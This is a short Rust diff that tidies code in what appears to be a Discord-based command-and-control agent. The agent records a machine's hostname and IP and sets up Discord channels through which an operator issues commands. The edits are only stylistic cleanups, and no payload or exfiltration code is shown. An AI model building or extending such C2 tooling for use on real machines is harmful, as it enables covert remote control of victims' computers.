@@ -31,8 +31,8 @@ impl Agent {
         let agent = Agent {
             category_channel,
             command_channel,
-            hostname_user: hostname_user.to_string(),
-            ip_address: ip_address.to_string(),
+            hostname_user,
+            ip_address,
             session_channel: None,
         };
         agent.write()?;
@@ -62,7 +62,7 @@ impl Agent {
         let mut file = get_config()?;
 
         // Truncate the file to 0 bytes (this fixes the JSON parser error where session go from epoch's to null)
-        file.set_len(0).map_err(|err| DiscordC2Error::from(err))?;
+        file.set_len(0).map_err(DiscordC2Error::from)?;
 
         // Serialize the Agent object to JSON
         let agent_json = serde_json::to_string(&self)
@@ -70,7 +70,7 @@ impl Agent {
 
         // Write the JSON data to the file
         file.write_all(agent_json.as_bytes())
-            .map_err(|err| DiscordC2Error::from(err))?;
+            .map_err(DiscordC2Error::from)?;
 
         Ok(())
     }
@@ -128,8 +128,8 @@ fn get_config() -> Result<File, DiscordC2Error> {
         .read(true)
         .write(true)
         .create(true)
-        .open(&file_path)
-        .map_err(|err| DiscordC2Error::from(err))?;
+        .open(file_path)
+        .map_err( DiscordC2Error::from)?;
 
     Ok(file)
 }
@@ -143,11 +143,11 @@ pub async fn get_or_create_agent(ctx: &Context) -> Agent {
             let (hostname, ip) = (user(), ip().await.unwrap());
 
             // Create the channels
-            let category_id = create_category_channel(&ctx, format!("{} - {}", hostname, ip))
+            let category_id = create_category_channel(ctx, format!("{} - {}", hostname, ip))
                 .await
                 .unwrap(); // TODO: Better error handling
             let command_id = create_text_channel(
-                &ctx,
+                ctx,
                 "commands",
                 &category_id,
                 "This is the central command center for your agent. Run some slash commands here!",
